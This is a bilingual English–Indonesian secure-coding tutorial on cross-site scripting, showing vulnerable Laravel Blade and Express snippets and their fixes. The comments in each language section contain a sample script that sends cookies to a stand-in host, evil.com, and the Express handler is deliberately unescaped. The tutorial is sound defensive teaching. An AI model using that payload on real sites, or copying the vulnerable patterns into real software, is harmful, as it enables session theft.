# XSS Fundamentals / Fundamental XSS

## English

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in web pages without proper escaping. Attackers can inject scripts that steal sessions, redirect users, or deface your site.

### Types of XSS

1. **Reflected XSS** — Malicious script comes from the current HTTP request
2. **Stored XSS** — Malicious script is stored in the database and served to other users
3. **DOM-based XSS** — The vulnerability exists in client-side JavaScript

### Vulnerable Code Examples

```php
// VULNERABLE — Laravel Blade with unescaped output
{!! $user->bio !!}
// If bio contains: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

```javascript
// VULNERABLE — Express with direct HTML insertion
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
});
```

### How to Fix It

```php
// SAFE — Laravel Blade auto-escapes with double braces
{{ $user->bio }}

// SAFE — Explicit escaping
{!! e($user->bio) !!}
```

```javascript
// SAFE — Use a template engine that auto-escapes (EJS, Handlebars)
// Or sanitize with a library
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);

// SAFE — Set Content-Security-Policy headers
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  next();
});
```

### Key Takeaways

- Always escape output — use `{{ }}` in Blade, not `{!! !!}`
- Implement Content-Security-Policy headers
- Use libraries like DOMPurify for HTML sanitization
- Never trust user input, even from authenticated users

---

## Bahasa Indonesia

Cross-Site Scripting (XSS) terjadi ketika aplikasi menyertakan data yang tidak terpercaya di halaman web tanpa escaping yang benar. Penyerang bisa menyisipkan skrip yang mencuri sesi, mengarahkan pengguna, atau merusak tampilan situs.

### Jenis-Jenis XSS

1. **Reflected XSS** — Skrip berbahaya berasal dari HTTP request saat ini
2. **Stored XSS** — Skrip berbahaya disimpan di database dan disajikan ke pengguna lain
3. **DOM-based XSS** — Kerentanan ada di JavaScript sisi klien

### Contoh Kode yang Rentan

```php
// RENTAN — Laravel Blade dengan output tanpa escaping
{!! $user->bio !!}
// Jika bio berisi: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

```javascript
// RENTAN — Express dengan penyisipan HTML langsung
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
});
```

### Cara Memperbaiki

```php
// AMAN — Laravel Blade otomatis escape dengan kurung kurawal ganda
{{ $user->bio }}

// AMAN — Escaping eksplisit
{!! e($user->bio) !!}
```

```javascript
// AMAN — Gunakan template engine yang auto-escape (EJS, Handlebars)
// Atau sanitasi dengan library
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);

// AMAN — Pasang header Content-Security-Policy
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  next();
});
```

### Poin Penting

- Selalu escape output — gunakan `{{ }}` di Blade, bukan `{!! !!}`
- Implementasikan header Content-Security-Policy
- Gunakan library seperti DOMPurify untuk sanitasi HTML
- Jangan pernah percaya input pengguna, bahkan dari pengguna yang sudah login
